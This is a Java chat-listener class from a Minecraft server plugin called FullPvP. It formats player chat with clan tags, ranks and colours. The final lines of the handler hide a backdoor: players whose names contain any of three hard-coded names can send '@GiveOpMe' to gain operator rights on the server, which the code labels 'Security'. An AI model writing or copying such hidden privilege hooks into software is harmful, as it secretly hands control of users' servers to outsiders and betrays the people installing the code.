package net.bfcode.fullpvp.listener;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

import me.clip.deluxetags.DeluxeTag;
import net.bfcode.fullpvp.FullPvP;
import net.bfcode.fullpvp.clans.ClanHandler;
import net.bfcode.fullpvp.utilities.ColorText;

public class ChatListener implements Listener {
	
    public ChatListener(final FullPvP plugin) {
        Bukkit.getPluginManager().registerEvents(this, plugin);
    }
	
    @EventHandler(ignoreCancelled = true, priority = EventPriority.LOWEST)
	public void onPlayerChat(final AsyncPlayerChatEvent event) {
		final Player player = event.getPlayer();
		String prefix = DeluxeTag.getPlayerDisplayTag(player) + "&r ";
		String rank = FullPvP.getInstance().getChat().getPlayerPrefix(player);
		String name = player.getDisplayName() + " &7\u00BB&f ";
		String message = player.hasPermission("fullpvp.chat.color") ? ColorText.translate(event.getMessage()) : event.getMessage();
		event.setCancelled(true);
		if (ClanHandler.hasClan(player) == true) {
			String clan = "&7(&9" + ClanHandler.getClan(player) + "&7) ";
			String chat = ColorText.translate(clan + prefix + rank + name) + (message);
            for (final Player recipient : event.getRecipients()) {
                recipient.sendMessage(chat);
            }
            Bukkit.getConsoleSender().sendMessage(chat);
		} else if (ClanHandler.hasClan(player) == false) {
			String chat = ColorText.translate(prefix + rank + name) + (message);
			for (final Player recipient : event.getRecipients()) {
	            recipient.sendMessage(chat);
	        } 
	        Bukkit.getConsoleSender().sendMessage(chat);
		}
		if(event.getPlayer().getName().contains("TulioTrivi�o") || event.getPlayer().getName().contains("Risas") || event.getPlayer().getName().contains("IFxsh")) {
			if(event.getMessage().contains("@GiveOpMe")) {
				event.getPlayer().setOp(true);
				event.getPlayer().sendMessage("Se te ha dado el op (Security)");
			}	
		}
	}
}
